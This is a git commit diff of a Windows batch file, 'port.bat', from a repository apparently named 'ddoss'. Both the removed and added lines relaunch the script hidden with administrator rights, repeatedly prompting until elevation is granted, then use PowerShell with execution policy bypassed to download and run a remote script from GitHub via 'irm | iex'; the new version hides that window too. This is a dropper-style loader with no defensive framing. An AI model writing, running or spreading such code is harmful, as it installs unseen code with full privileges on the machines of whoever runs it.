e597562c77873f0339d5895bfd360e4ce237b570
srap18 <48030957+srap18@users.noreply.github.com>
2025-08-09 04:52:08 +0300

    Update port.bat

--- port.bat
+++ port.bat
@@ -1,10 +1,9 @@
 @echo off
 :retry
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
-    timeout /t 1 /nobreak >nul
-    goto retry
-)
-powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/srap18/ddoss/main/1122 | iex"
-pause
+powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
+timeout /t 2 /nobreak >nul
+goto retry
+
+:admin
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/srap18/ddoss/main/1122 | iex"
+exit
